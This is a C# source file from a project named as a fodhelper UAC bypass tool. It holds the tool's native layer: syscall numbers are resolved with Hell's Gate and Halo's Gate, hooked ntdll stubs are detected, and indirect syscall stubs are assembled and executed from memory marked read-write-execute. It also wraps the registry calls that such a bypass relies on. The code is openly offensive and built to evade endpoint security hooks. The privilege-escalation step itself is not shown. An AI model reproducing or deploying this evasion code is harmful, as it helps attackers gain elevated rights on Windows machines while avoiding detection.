using System;
using System.Runtime.InteropServices;
using System.Text;

namespace FODHelperUACBypass_NG
{
    public static class Native
    {
        #region Constants

        public const uint STATUS_SUCCESS = 0x00000000;
        public const uint STATUS_BUFFER_TOO_SMALL = 0xC0000023;
        
        // Registry access rights
        public const uint KEY_QUERY_VALUE = 0x0001;
        public const uint KEY_SET_VALUE = 0x0002;
        public const uint KEY_CREATE_SUB_KEY = 0x0004;
        public const uint KEY_ENUMERATE_SUB_KEYS = 0x0008;
        public const uint KEY_NOTIFY = 0x0010;
        public const uint KEY_CREATE_LINK = 0x0020;
        public const uint KEY_WOW64_64KEY = 0x0100;
        public const uint KEY_WOW64_32KEY = 0x0200;
        public const uint KEY_ALL_ACCESS = 0xF003F;
        public const uint KEY_WRITE = 0x20006;

        // Registry options
        public const uint REG_OPTION_NON_VOLATILE = 0x00000000;
        public const uint REG_OPTION_VOLATILE = 0x00000001;
        public const uint REG_OPTION_CREATE_LINK = 0x00000002;
        public const uint REG_OPTION_BACKUP_RESTORE = 0x00000004;
        public const uint REG_OPTION_OPEN_LINK = 0x00000008;

        // Registry value types
        public const uint REG_NONE = 0;
        public const uint REG_SZ = 1;
        public const uint REG_EXPAND_SZ = 2;
        public const uint REG_BINARY = 3;
        public const uint REG_DWORD = 4;

        // Registry key information classes
        public const int KeyBasicInformation = 0;
        public const int KeyFullInformation = 1;

        // Object attributes flags
        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
        public const uint OBJ_OPENIF = 0x00000080;

        // Process creation flags
        public const uint PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;

        // Status codes
        public const uint STATUS_NO_MORE_ENTRIES = 0x8000001A;

        #endregion

        #region Structures

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LARGE_INTEGER
        {
            public long QuadPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KEY_VALUE_PARTIAL_INFORMATION
        {
            public uint TitleIndex;
            public uint Type;
            public uint DataLength;
            public byte Data;
        }

        #endregion

        #region Delegates

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtCreateKeyDelegate(
            out IntPtr KeyHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            uint TitleIndex,
            IntPtr Class,
            uint CreateOptions,
            out uint Disposition);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtOpenKeyDelegate(
            out IntPtr KeyHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtSetValueKeyDelegate(
            IntPtr KeyHandle,
            ref UNICODE_STRING ValueName,
            uint TitleIndex,
            uint Type,
            IntPtr Data,
            uint DataSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtDeleteKeyDelegate(
            IntPtr KeyHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtRenameKeyDelegate(
            IntPtr KeyHandle,
            ref UNICODE_STRING NewName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtEnumerateKeyDelegate(
            IntPtr KeyHandle,
            uint Index,
            int KeyInformationClass,
            IntPtr KeyInformation,
            uint Length,
            out uint ResultLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtCloseDelegate(
            IntPtr Handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtDelayExecutionDelegate(
            bool Alertable,
            ref LARGE_INTEGER DelayInterval);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint RtlCreateUserProcessDelegate(
            ref UNICODE_STRING NtImagePathName,
            uint AttributesDeprecated,
            IntPtr ProcessParameters,
            IntPtr ProcessSecurityDescriptor,
            IntPtr ThreadSecurityDescriptor,
            IntPtr ParentProcess,
            bool InheritHandles,
            IntPtr DebugPort,
            IntPtr ExceptionPort,
            IntPtr ProcessInfo);

        #endregion

        #region Indirect Syscall Infrastructure

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static IntPtr _ntdllBase = IntPtr.Zero;

        private static IntPtr GetNtdllBase()
        {
            if (_ntdllBase == IntPtr.Zero)
            {
                _ntdllBase = GetModuleHandle("ntdll.dll");
            }
            return _ntdllBase;
        }

        private static IntPtr GetFunctionAddress(string functionName)
        {
            IntPtr ntdll = GetNtdllBase();
            if (ntdll == IntPtr.Zero)
                throw new Exception("Failed to get ntdll.dll base address");

            IntPtr funcAddr = GetProcAddress(ntdll, functionName);
            if (funcAddr == IntPtr.Zero)
                throw new Exception($"Failed to resolve {functionName}");

            return funcAddr;
        }

        private static uint GetSyscallNumber(IntPtr functionAddress)
        {
            // Hell's Gate technique: Extract SSN from function prologue
            byte[] buffer = new byte[32];
            Marshal.Copy(functionAddress, buffer, 0, 32);

            // Check for clean syscall stub: mov r10, rcx; mov eax, SSN
            if (buffer[0] == 0x4C && buffer[1] == 0x8B && buffer[2] == 0xD1 && buffer[3] == 0xB8)
            {
                // SSN is at offset 4 (little-endian)
                return BitConverter.ToUInt32(buffer, 4);
            }

            // Function might be hooked, try Halo's Gate (search nearby)
            return GetSyscallNumberHalosGate(functionAddress);
        }

        private static uint GetSyscallNumberHalosGate(IntPtr hookedFunction)
        {
            // Search up and down for clean syscall stubs
            for (int offset = 32; offset < 500; offset += 32)
            {
                // Check below
                try
                {
                    byte[] bufferDown = new byte[32];
                    Marshal.Copy(hookedFunction + offset, bufferDown, 0, 32);
                    if (IsCleanSyscall(bufferDown))
                    {
                        uint nearbySSN = BitConverter.ToUInt32(bufferDown, 4);
                        // Infer SSN (functions are typically sequential)
                        return nearbySSN - (uint)(offset / 32);
                    }
                }
                catch { }

                // Check above
                try
                {
                    byte[] bufferUp = new byte[32];
                    Marshal.Copy(hookedFunction - offset, bufferUp, 0, 32);
                    if (IsCleanSyscall(bufferUp))
                    {
                        uint nearbySSN = BitConverter.ToUInt32(bufferUp, 4);
                        return nearbySSN + (uint)(offset / 32);
                    }
                }
                catch { }
            }

            throw new Exception("Failed to resolve syscall number");
        }

        private static bool IsCleanSyscall(byte[] buffer)
        {
            return buffer[0] == 0x4C && buffer[1] == 0x8B && 
                   buffer[2] == 0xD1 && buffer[3] == 0xB8;
        }

        private static IntPtr FindSyscallInstruction(IntPtr functionAddress)
        {
            // Find syscall instruction (0x0F 0x05) within function
            for (int i = 0; i < 100; i++)
            {
                byte[] buffer = new byte[2];
                Marshal.Copy(functionAddress + i, buffer, 0, 2);

                if (buffer[0] == 0x0F && buffer[1] == 0x05)
                {
                    return functionAddress + i;
                }
            }

            throw new Exception("Failed to find syscall instruction");
        }

        private static byte[] CreateIndirectSyscallStub(uint ssn, IntPtr syscallAddr)
        {
            // x64 indirect syscall stub (from EvasiveSyscallInjector)
            // mov r10, rcx        ; Save first parameter (syscall convention)
            // mov eax, <SSN>      ; Load syscall number
            // mov r11, addr       ; Load jump target
            // jmp r11             ; Jump to syscall in ntdll

            byte[] stub = new byte[21];

            // mov r10, rcx
            stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;

            // mov eax, ssn
            stub[3] = 0xB8;
            BitConverter.GetBytes(ssn).CopyTo(stub, 4);

            // mov r11, syscall_address
            stub[8] = 0x49; stub[9] = 0xBB;
            BitConverter.GetBytes(syscallAddr.ToInt64()).CopyTo(stub, 10);

            // jmp r11
            stub[18] = 0x41; stub[19] = 0xFF; stub[20] = 0xE3;

            return stub;
        }

        #endregion

        #region Syscall Wrappers

        private static byte[] _stubNtCreateKey;
        private static byte[] _stubNtOpenKey;
        private static byte[] _stubNtSetValueKey;
        private static byte[] _stubNtDeleteKey;
        private static byte[] _stubNtRenameKey;
        private static byte[] _stubNtEnumerateKey;
        private static byte[] _stubNtClose;
        private static byte[] _stubNtDelayExecution;

        private static uint ExecuteSyscall<T>(ref byte[] stub, string functionName, Func<T, uint> invoke) where T : Delegate
        {
            if (stub == null)
            {
                IntPtr funcAddr = GetFunctionAddress(functionName);
                uint ssn = GetSyscallNumber(funcAddr);
                IntPtr syscallAddr = FindSyscallInstruction(funcAddr);
                stub = CreateIndirectSyscallStub(ssn, syscallAddr);
            }

            unsafe
            {
                fixed (byte* p = stub)
                {
                    IntPtr addr = (IntPtr)p;
                    VirtualProtect(addr, (uint)stub.Length, 0x40, out _); // PAGE_EXECUTE_READWRITE
                    return invoke(Marshal.GetDelegateForFunctionPointer<T>(addr));
                }
            }
        }

        public static uint NtCreateKey(
            out IntPtr keyHandle,
            uint desiredAccess,
            ref OBJECT_ATTRIBUTES objectAttributes,
            uint titleIndex,
            IntPtr classPtr,
            uint createOptions,
            out uint disposition)
        {
            IntPtr hKey = IntPtr.Zero;
            uint disp = 0;
            OBJECT_ATTRIBUTES objAttr = objectAttributes;
            
            uint result = ExecuteSyscall<NtCreateKeyDelegate>(ref _stubNtCreateKey, "NtCreateKey",
                d => d(out hKey, desiredAccess, ref objAttr, titleIndex, classPtr, createOptions, out disp));
            
            keyHandle = hKey;
            disposition = disp;
            objectAttributes = objAttr;
            return result;
        }

        public static uint NtOpenKey(
            out IntPtr keyHandle,
            uint desiredAccess,
            ref OBJECT_ATTRIBUTES objectAttributes)
        {
            IntPtr hKey = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = objectAttributes;
            uint result = ExecuteSyscall<NtOpenKeyDelegate>(ref _stubNtOpenKey, "NtOpenKey",
                d => d(out hKey, desiredAccess, ref objAttr));
            keyHandle = hKey;
            objectAttributes = objAttr;
            return result;
        }

        public static uint NtSetValueKey(
            IntPtr keyHandle,
            ref UNICODE_STRING valueName,
            uint titleIndex,
            uint type,
            IntPtr data,
            uint dataSize)
        {
            UNICODE_STRING valName = valueName;
            uint result = ExecuteSyscall<NtSetValueKeyDelegate>(ref _stubNtSetValueKey, "NtSetValueKey",
                d => d(keyHandle, ref valName, titleIndex, type, data, dataSize));
            valueName = valName;
            return result;
        }

        public static uint NtDeleteKey(IntPtr keyHandle)
        {
            return ExecuteSyscall<NtDeleteKeyDelegate>(ref _stubNtDeleteKey, "NtDeleteKey",
                d => d(keyHandle));
        }

        public static uint NtRenameKey(IntPtr keyHandle, ref UNICODE_STRING newName)
        {
            UNICODE_STRING name = newName;
            uint result = ExecuteSyscall<NtRenameKeyDelegate>(ref _stubNtRenameKey, "NtRenameKey",
                d => d(keyHandle, ref name));
            newName = name;
            return result;
        }

        public static uint NtEnumerateKey(
            IntPtr keyHandle,
            uint index,
            int keyInformationClass,
            IntPtr keyInformation,
            uint length,
            out uint resultLength)
        {
            uint resLen = 0;
            uint result = ExecuteSyscall<NtEnumerateKeyDelegate>(ref _stubNtEnumerateKey, "NtEnumerateKey",
                d => d(keyHandle, index, keyInformationClass, keyInformation, length, out resLen));
            resultLength = resLen;
            return result;
        }

        public static uint NtClose(IntPtr handle)
        {
            return ExecuteSyscall<NtCloseDelegate>(ref _stubNtClose, "NtClose",
                d => d(handle));
        }

        public static uint NtDelayExecution(bool alertable, ref LARGE_INTEGER delayInterval)
        {
            LARGE_INTEGER delay = delayInterval;
            uint result = ExecuteSyscall<NtDelayExecutionDelegate>(ref _stubNtDelayExecution, "NtDelayExecution",
                d => d(alertable, ref delay));
            delayInterval = delay;
            return result;
        }

        #endregion
    }
}
